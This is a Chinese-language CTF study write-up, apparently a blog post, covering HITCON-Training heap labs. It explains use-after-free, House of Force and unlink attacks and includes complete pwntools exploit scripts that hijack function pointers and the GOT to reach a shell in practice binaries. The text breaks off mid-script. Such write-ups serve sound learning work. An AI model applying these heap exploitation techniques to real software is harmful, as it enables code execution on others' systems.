class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Lab10"><a href="#Lab10" class="headerlink" title="Lab10"></a>Lab10</h1><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/14.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/15.png"></div><p>node结构体8个字节。第一个功能是添加信息：第一个是malloc一个node结构体，接下来输入存储字符串的长度，再malloc一个合适的堆块。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/16.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/17.png"></div>删除的时候没有指针没有置空。可以考虑UAF的利用方式。<p>UAF即use after free。存储块小于64b的堆块释放之后由fastbin来进行管理。释放的那个放在表头，分配的时候直接从表头开始获取。</p><p>在指针未指空的情况下，释放的堆块则还可以使用。</p><p>我们看到node中第一个成员是函数指针，里面存放着打印字符串的函数地址。我们考虑是不是可以通过UAF来修改node中的函数指针的值，指向源码提供的magic函数。</p><p>具体做法：<br>申请一个node0，16长度的字符串<br>申请一个node1，16长度的字符串<br>释放node0<br>释放node1<br>申请一个node2，8长度的字符串<br>此时8长度字符串的的堆块实际上是node0存放的node结构体的堆块<br>我们便可以进行修改函数指针的指向。<br>最后由于指针未指NULL可以继续调用node0的printf函数，则会执行我们期望执行的函数</p><p>exp</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./hacknote"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add_node</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete_node</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">print_node</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">)</span>magic_addr <span class="token operator">=</span> <span class="token number">0x8048986</span>add_node<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token string">"aaaa"</span><span class="token punctuation">)</span>add_node<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token string">"bbbb"</span><span class="token punctuation">)</span>delete_node<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delete_node<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add_node<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span>magic_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>print_node<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Lab11"><a href="#Lab11" class="headerlink" title="Lab11"></a>Lab11</h1><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/18.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/19.png"></div>首先malloc一个box，看看box是什么东西：<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/20.png"></div>两个函数指针。同时发现有后门函数：<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/21.png"></div>第一个思路就是是否可以任意地址修改，将函数指针改为magic<p>add功能：输入长度，malloc一个大小一样的chunk存放字符串<br>delete功能：输入id，删除<br>edit功能：输入id，输入长度，在输入新的字符串<br>show功能：打印字符串</p><h2 id="思路一-House-of-force"><a href="#思路一-House-of-force" class="headerlink" title="思路一 House of force"></a>思路一 House of force</h2><p>第一个思路就是想办法将第一个chunk的内容的函数指针改为后门函数</p><p>第一步：完成相关功能函数</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>size<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/22.png"></div>目标就是覆盖函数指针。<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/23.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/24.png"></div>可以修改。那方法就是hose of lore<p>回顾一下house of lore，将top chunk的设置为最大，然后再分配负的chunk尺寸，这样就会将top chunk向上抬。那么下次分配就可以按自己的目标来分配chunk。调试如下：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/25.png"></div><p>那么需要抬0xa0单位。也就是分配-0xa0大小的chunk</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/26.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/27.png"></div><p>成功的将栈顶抬到想分配的地址</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/28.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/29.png"></div>修改函数指针<p>exp</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./bamboobox"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>size<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span>magic_addr <span class="token operator">=</span> <span class="token number">0x0000000000400d49</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">"aaaa"</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x71</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xffffffffffffffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token string">"aaaa"</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>magic_addr<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="思路二-Unlink"><a href="#思路二-Unlink" class="headerlink" title="思路二 Unlink"></a>思路二 Unlink</h2><p>尝试 用unlink的方式来解题。里面有几个关键步骤：通过free来修改fd，bk达到任意地址读写的目的。</p><p>第一步：找到指针<br>第二步：构造伪chunk，并free掉某个chunk，将fd劫持到一个新的位置上进行读写。<br>第三步：修改指针，达到任意内存读写的目的（这里采用劫持got表的方法）</p><p>第一步分配三个chunk，中间大两边小：</p><pre class="line-numbers language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#0</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#1</span>add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/30.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/31.png"></div><p>我们考虑要free第一个chunk，让它往前覆盖，所以我们再在1那里做一个伪造的chunk。假的chunk在0x2119030处，那么该指针为0x6020c8，就像 视频中讲解的r一样。</p><p>伪造chunk：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/32.png"></div><pre class="line-numbers language-python"><code class="language-python">ptr <span class="token operator">=</span> <span class="token number">0x6020c8</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>          <span class="token comment" spellcheck="true"># 前一个大小为0</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># 这个chunk的大小</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>ptr<span class="token number">-0x18</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># fd</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>ptr<span class="token number">-0x10</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># bk</span>payload<span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x10</span>        <span class="token comment" spellcheck="true"># 还有0x10个单位空余，将其填充</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># 对于第一个chunk的前一个大小，因为我们要合并</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true"># 需要加上头部，一会儿试试不加头部行不行</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>删除第一号chunk</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/33.png"></div>指针已经成功指向0x6020b0,也就是这个指针的前面。我们看看前面的数据：<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/34.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/35.png"></div><p>修改got表：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/36.png"></div>选择这个作为改变目标，方便控制改为system刚好可以直接传参getshell。<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/37.png"></div>成功将指针修改为0x602068。最后再将值 传入指针的位置。<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/hitcon-training-xi-lie-xue-xi-ji-lu/38.png"></div><p>exp</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#context.log_level = "debug"</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./bamboobox'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>size<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#0</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#1</span>add<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#2</span>ptr <span class="token operator">=</span> <span class="token number">0x6020c8</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>          <span class="token comment" spellcheck="true"># 前一个大小为0</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># 这个chunk的大小</span>payload<span class="token operator">+=</span> 